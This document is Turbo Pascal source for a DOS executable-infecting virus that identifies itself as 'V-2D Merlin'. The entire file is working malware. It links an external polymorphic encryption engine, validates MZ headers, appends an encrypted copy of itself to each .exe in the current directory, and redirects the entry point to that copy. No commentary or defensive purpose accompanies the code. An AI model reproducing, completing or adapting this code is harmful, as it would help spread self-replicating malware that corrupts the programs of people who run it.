   {$S- $R- $Q- $F-}
   uses dos;
   type
         mz_hdr = record
           Signature:   Word;
           ExtraBytes:  Word;
           Pages:       Word;
           RelocItems:  Word;
           HeaderSize:  Word;
           MinAlloc:    Word;
           MaxAlloc:    Word;
           InitSS:      Word;
           InitSp:      Word;
           CheckSum:    Word;
           InitIP:      Word;
           InitCS:      Word;
           RelocTable:  Word;
           Overlay:     Word;
   end;
   type
         virii = record
         buffer: Pointer;
         source: Pointer;
         vl:     word;
         OfsSS:  ^word;
         OfsSP:  ^word;
         OfsCS:  ^word;
         OfsIP:  ^word;
   end;

   procedure randomize; external; {$L engine.obj}
   procedure engine;    external;

   var
        f: file;
        dirinfo: searchrec;
        vir: virii;
        mz: mz_hdr;

   function  LME(IP: word): word; assembler;
   asm
        push ds
        push es
        mov cx, vir.vl
        mov ax, ip
        les di, vir.buffer
        lds si, vir.source
        shr cx, 1
        adc cx, 0
        call engine
        xchg ax, cx
        pop es
        pop ds
   end;

   procedure infect( fname: string );
   var
        attr: word;
   begin
        assign(f, fname);
        {$i-} reset(f, 1); {$i+}
        if IOResult <> 0 then Exit;
        if (FileSize(f) < 1000) Or (FileSize(f) > (200*1024) ) Then
           Begin Close(f); Exit; End;
        BlockRead(f, Addr(mz)^, sizeof(mz_hdr));
        if mz.InitCS = mz.InitSS Then
           Begin Close(f); Exit; End;
        attr := FileSize(f) mod 512;
        if attr <> mz.ExtraBytes Then
           Begin Close(f); Exit; End;
        if attr <> 0 Then Dec(mz.Pages);
        if (FileSize(f) div 512) <> mz.Pages Then
           Begin Close(f); Exit; End;
        if (mz.signature = $5A4D) or (mz.Signature = $4D5A) then
        else
           Begin Close(f); Exit; End;
        vir.ofsip^ := mz.initip;
        vir.ofscs^ := mz.initcs;
        vir.ofsss^ := mz.initss;
        vir.ofssp^ := mz.initsp;
        attr := lme((Filesize(f)-mz.HeaderSize*16) mod $10);
        mz.InitIP := (Filesize(f)-mz.HeaderSize*16) mod $10;
        mz.InitCS := (Filesize(f)-mz.HeaderSize*16) div $10;
        mz.InitSS := mz.InitCS;
        mz.InitSP := $FFFE;
        mz.Pages  := (FileSize(f)+attr) div 512;
        mz.ExtraBytes := (FileSize(f)+attr) mod 512;
        if mz.ExtraBytes <> 0 Then Inc(mz.Pages);
        Seek(f, FileSize(f));
        BlockWrite(f, vir.buffer^, attr);
        Seek(f, 0);
        BlockWrite(f, Addr(mz)^, sizeof(mz_hdr));
        Close(f);
   end;

   var
        r: registers;
   const
        test_write = #255#0;
   begin
        randomize;
        r.ds := seg(vir);
        r.si := ofs(vir);
        intr($91,r);
        if PortW[$40] = 666 then
           Writeln('V-2D Merlin');
        assign(f, test_write);
        {$i-} rewrite(f, 1); {$i+}
        if IOResult <> 0 Then Halt(0);
        close(f);
        erase(f);
        FindFirst('*.exe', Archive, DirInfo);
        while DosError = 0 do
        begin
           Infect(DirInfo.Name);
           FindNext(DirInfo);
        end;
   end.
